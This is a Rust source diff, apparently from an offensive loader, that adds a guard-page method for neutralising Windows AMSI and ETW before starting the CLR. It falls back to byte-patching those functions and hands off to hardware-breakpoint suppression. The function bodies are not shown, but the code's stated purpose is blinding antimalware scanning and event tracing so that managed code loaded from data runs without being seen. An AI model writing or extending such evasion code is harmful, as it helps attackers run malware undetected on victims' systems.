@@ -134,7 +134,11 @@ fn wide(text: &str) -> Vec<u16> {
     text.encode_utf16().chain(std::iter::once(0)).collect()
 }
 
-/// Pre-start phase of AMSI/ETW neutralization: the legacy byte patch
+/// Pre-start phase of AMSI/ETW neutralization. Preferred order:
+/// guard-page interposition (ABR-T041) when opted in — zero bytes of
+/// signed modules change, and unlike the byte patch it cannot land
+/// "mid-instruction" because the retirement happens at function entry
+/// with the caller's stack untouched. Fallback: the legacy byte patch
 /// (ABR-T024) BEFORE `CorBindToRuntimeEx`. The runtime initializes fine
 /// with the stubs already in place (they answer every scan/scan-write
 /// with "invalid argument"/"success"), but the same patch landing on a
@@ -142,6 +146,18 @@ fn wide(text: &str) -> Vec<u16> {
 /// managed EventProvider — found live during the bench rerun), so the
 /// patch is the shield for the start and the breakpoints take over after.
 fn patch_for_clr_start(notes: &mut Vec<&'static str>) {
+    if crate::evasion::guard_requested() {
+        match crate::evasion::guard::ensure_armed() {
+            Ok(_) => {
+                let (s1, s2) = crate::evasion::guard::rearm_trace();
+                let note = format!("amsi=guard,etw=guard rearm={s1:#x}/{s2:#x}");
+                // Leaked 'static from format!: notes only outlive the call.
+                notes.push(Box::leak(note.into_boxed_str()));
+                return;
+            }
+            Err(_) => notes.push("guard=refused,patch-fallback"),
+        }
+    }
     match crate::evasion::patch::patch_amsi() {
         Ok(_) => notes.push("amsi=patched"),
         Err(_) => notes.push("amsi=unavailable"),
@@ -161,9 +177,11 @@ fn patch_for_clr_start(notes: &mut Vec<&'static str>) {
 /// On failure (hypervisor-owned debug registers) the byte patch simply
 /// stays. `SetThreadContext` on the debug registers poisons a thread
 /// for a SUBSEQUENT runtime start, which is exactly why this runs after
-/// `Start()` and never before.
+/// `Start()` and never before. If the guard variant (ABR-T041) is
+/// holding the pages, it stands down for the breakpoints.
 fn suppress_amsi_etw(notes: &mut Vec<&'static str>) {
     if crate::evasion::hwbp::ensure_armed().is_ok() {
+        let _ = crate::evasion::guard::disarm();
         if crate::evasion::patch::unpatch().is_ok() {
             notes.push("amsi=hwbp,etw=hwbp");
             return;
@@ -171,8 +189,8 @@ fn suppress_amsi_etw(notes: &mut Vec<&'static str>) {
         // Unpatch failed (page flip refused): keep the stubs and say so.
         notes.push("hwbp=armed,patch-kept");
     }
-    // Arming blocked (hypervisor-owned debug registers): the pre-start
-    // byte patch stays — already reported by patch_for_clr_start.
+    // Arming blocked (hypervisor-owned debug registers): whatever the
+    // pre-start phase chose stays — already reported there.
 }
 
 /// Hosts the CLR, runs `type_name.method_name(argument)` from `data`
